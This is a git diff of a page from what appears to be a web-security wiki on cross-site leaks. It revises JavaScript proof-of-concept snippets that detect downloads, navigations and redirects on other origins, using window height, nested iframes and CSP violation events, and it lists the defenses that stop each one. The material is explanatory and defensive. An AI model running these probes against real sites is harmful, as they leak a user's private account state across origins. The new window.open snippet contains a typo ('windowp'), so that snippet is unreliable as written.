@@ -32,7 +32,7 @@ To detect ifany kind of navigation occurred, an attacker can:
 
 ## Download Trigger
 
-When endpoints set the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) header, it instructs the browser to download the response as an attachment instead of navigating to it. Detecting if this behavior occurred might allow attackers to leak private information if outcome depends on the state of the victim's account.
+When endpoints sets the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) header, it instructs the browser to download the response as an attachment instead of navigating to it. Detecting if this behavior occurred might allow attackers to leak private information if outcome depends on the state of the victim's account.
 
 ### Download bar
 
@@ -40,71 +40,84 @@ In Chromium-based browsers when a file is downloaded, a preview of the download 
 
 
 ```javascript
-
-// Any Window reference (can also be done using an iframe in some cases)
-const tab = window.opener;
-
-// The current window height
-const screenHeight = window.innerHeight;
-
-// The size of the chrome download bar on, for example, mac os x
-const downloadsBarSize = 49;
-
-tab.location = 'https://target.page';
-
+// Read the current height of the window
+var screenHeight = window.innerHeight;
+// Load the page that will or will not trigger the download
+window.open('https://example.org');
+// Wait for a tab to load
 setTimeout(() => {
-    let margin = screenHeight - window.innerHeight;
-    if (margin === downloadsBarSize) {
-       return console.log('downloads bar detected');
+    // If the download bar appears, the height of all tabs will be smaller
+    if (window.innerHeight !== screenHeight) {
+      console.log('Download bar detected');
+    } else {
+      console.log('Download bar not detected');
     }
-}, 5 * 1000);
+}, 2000);
 ```
 
-{{< hint good >}}
-This attack is only possible in Chromium-based browsers.
+{{< hint warning >}}
+This attack is only possible in Chromium-based browsers with automatic downloads enabled. The attack can't be also repeated since the user needs to close the download bar for it to be measureable again.
 {{< /hint >}}
 
-### Download Navigation
+### Download Navigation (with iframes)
 
-Another way to test for the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) header is to check if a navigation occurred. If a page load causes a download, it will not trigger a navigation. 
+Another way to test for the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) header is to check if a navigation occurred. If a page load causes a download, it will not trigger a navigation and the window will stame within the same origin.
 
-1. Open an attacker origin with `window.open` and save the window reference.
-2. Navigate the saved reference to the endpoint that might download.
-3. After a timeout, check if the window is still same-origin
+The following snippet can be used to detect whether such navigation has occured.
 
-The snippet presented in the [Cross-Window Timing]({{< ref "../attacks/timing-attacks/network-timing.md#cross-window-timing-attacks" >}}) XS-Leak can be slightly adapted to detect this behavior.
+```javascript
+// Set the destination URL
+var url = 'https://example.org';
+// Create an outer iframe
+var iframe = document.createElement('iframe');
+document.body.appendChild(iframe);
+iframe.srcdoc = `
+  <!-- Create an inner iframe -->
+  <iframe name="inner" src="${url}" ></iframe>
+  <script>
+    // When window loads check if the inner iframe is same origin.
+    onload = () => {
+      try {
+          inner.name; // if the navigations occurs it will throw an exception
+          parent.console.log('Download attempt detected');
+      } catch(e) {
+          parent.console.log('No download attempt detected');
+      }
+    }
+  </script>`;
+```
 
-#### Download Navigation (without timeout)
+{{< hint info >}}
+This attack will work regardless of the [Framing Protections]({{< ref "xfo" >}}), because the `X-Frame-Options` and `Content-Security-Policy` headers are ignored in case of `Content-Disposition` being present.
+{{< /hint >}}
 
-The following snippet can obtain a more precise measurement without relying on timeouts and imprecise timings.
+The technique works as follows:
 
-{{< highlight javascript "linenos=table,linenostart=1" >}}
-onmessage = e => console.log(e.data);
-var outer = document.createElement('iframe');
-var url = 'https://target.page';
-outer.src = `data:text/html,\
-            <iframe id='inner' src="${url}" ></iframe>
-            <!-- onload is part of outer iframe -->
-            <script>onload=()=>{
-                try {
-                    inner.contentWindow.location.href;
-                    top.postMessage('download attempt','*');
-                } catch(e) {
-                    top.postMessage('no download','*');
-                }
-            }</script>`;
-outer.onload = ()=>{outer.remove();}
-document.body.appendChild(outer);
-{{< / highlight >}}
+1. Include an inner `iframe` inside an outer `iframe` and point it to the destination resource.
+2. If the embedded resource triggers a download the origin of the inner `iframe` will remain as its parent, otherwise, it will change to `https://example.org`.
+3. Because the `window.onload` event listener triggers when all the resources has been loaded (including iframes), no timing is needed to determine when the iframe finished loading.
+4. When the window loaded, the outer iframes tests whether the inner iframe stayed the same origin.
 
-The attack works as follows:
+### Download Navigation (without iframes)
 
-1. Include an `iframe` (inner) inside an `iframe` (outer). The inner `iframe` embeds the target website.
-2. If the target website triggers a download the inner `iframe` origin will remain `about:blank` (downloads don’t navigate).
-3. Even though the download attempt doesn't trigger an `onload` event on the inner `iframe`, the window of the `outer` `iframe` (line 7) still waits for the resource to start the download and fires the `onload` event.
-4. If a navigation has occurred the inner `iframe` will change its origin. 
-5. When the outer `iframe` `onload` fires the outer `iframe` verifies if `i.contentWindow.location.href` (line 9) is accessible, only possible if both `iframes` share the same origin (Same-Origin Policy is enforced). If both `iframes` are in different origins, a `DOMException` will be thrown, meaning a navigation occurred.
+A variation of the technique presented in the previous section can be also effectively tested using windows.
 
+```javascript
+// Set the destination URL
+var url = 'https://example.org';
+// Get a window reference
+var win = windowp.open(url);
+
+// Wait for the window to load.
+setTimeout(() => {
+      try {
+          win.name; // if the navigations occurs it will throw an exception
+          parent.console.log('Download attempt detected');
+      } catch(e) {
+          parent.console.log('No download attempt detected');
+      }
+}, 2000);
+```
 
 ## Server-Side Redirects
 
@@ -112,21 +125,32 @@ The attack works as follows:
 
 A server-side redirect can be detected from a cross-origin page if the destination URL increases in size and contains an attacker controlled input (either in the form of a query string parameter or a path). The following technique relies on the fact that it is possible to induce an error in most web-servers by generating big requests parameters/paths. Since the redirect increases the size of the URL, it can be detected by sending exactly one character less than the server maximum capacity. That way if the size increases the server will respond with an error that can be detected from a cross-origin page (eg via Error Events).
 
+{{< hint info >}}
+The example of this attack was implemented [here](https://xsleaks.github.io/xsleaks/examples/redirect/).
+{{< /hint >}}
 ## Cross-Origin Redirects
 
 ### CSP Violations
 
-[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (CSP) is an in-depth defense mechanism against XSS and data injection attacks. When a CSP is violated, a `SecurityPolicyViolationEvent` is thrown. An attacker can set up a CSP which will trigger a `Violation` event every time a `fetch` follows an URL not set in the CSP directive. This will allow an attacker to detect if a redirect to another origin occurred [^2] [^3]. 
+[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (CSP) is an in-depth defense mechanism against XSS and data injection attacks. When a CSP is violated, a `SecurityPolicyViolationEvent` is thrown. An attacker can set up a CSP which will trigger a `Violation` event every time a `fetch` follows an URL not set in the CSP directive. This will allow an attacker to detect if a redirect to another origin occurred [^2] [^3].
 
 The example below will trigger a `SecurityPolicyViolationEvent` if the website set in fetch API (line 6) redirects to a website different then `target.page`.
 
 {{< highlight html "linenos=table,linenostart=1" >}}
-<meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' target.page">
+<!-- Set the Content-Security-Policy to only allow example.org -->
+<meta http-equiv="Content-Security-Policy"
+      content="connect-src https://example.org">
 <script>
-document.addEventListener('securitypolicyviolation', e => {
+// Listen for a CSP violation event
+document.addEventListener('securitypolicyviolation', () => {
   console.log("redirected");
 });
-fetch('https://target.page/might_redirect', {mode: 'no-cors',credentials: 'include'});
+// Try to fetch example.org. If it redirects to anoter cross-site website
+// it will trigger a CSP violation event
+fetch('https://example.org/might_redirect', {
+  mode: 'no-cors',
+  credentials: 'include'
+});
 </script>
 {{< / highlight >}}
 
@@ -140,8 +164,8 @@ fetch('https://target.page/might_redirect', {mode: 'no-cors',credentials: 'inclu
 | Attack Alternative  | [Same-Site Cookies]({{< ref "../defenses/opt-in/same-site-cookies.md" >}})  | [Fetch Metadata]({{< ref "../defenses/opt-in/fetch-metadata.md" >}})  | [COOP]({{< ref "../defenses/opt-in/coop.md" >}})  |  [Framing Protections]({{< ref "../defenses/opt-in/xfo.md" >}}) |
 |:----------------------------------:|:--------------------------:|:---------------:|:-----:|:--------------------:|
 | iframe                             |         ✔️                 |      ✔️          |  ❌   |          ✔️          |
-| `History.length` (iframe)          |         ✔️                 |      ✔️          |  ❌   |          ✔️          |
-| `History.length` (window.open)     |         ✔️ [(if Strict)]({{< ref "../defenses/opt-in/same-site-cookies.md#lax-vs-strict" >}})    |      ✔️          |  ✔️   |          ❌          |
+| `history.length` (iframe)          |         ✔️                 |      ✔️          |  ❌   |          ✔️          |
+| `history.length` (window.open)     |         ✔️ [(if Strict)]({{< ref "../defenses/opt-in/same-site-cookies.md#lax-vs-strict" >}})    |      ✔️          |  ✔️   |          ❌          |
 | Download bar                       |         ✔️                 |      ✔️          |  ✔️   |          ✔️          |
 | Download Navigation (w/ timeout)   |         ✔️ [(if Strict)]({{< ref "../defenses/opt-in/same-site-cookies.md#lax-vs-strict" >}})     |      ✔️          |  ❓   |          ✔️          |
 | Download Navigation (no timeout)   |         ✔️                 |      ✔️          |  ✔️   |          ✔️          |
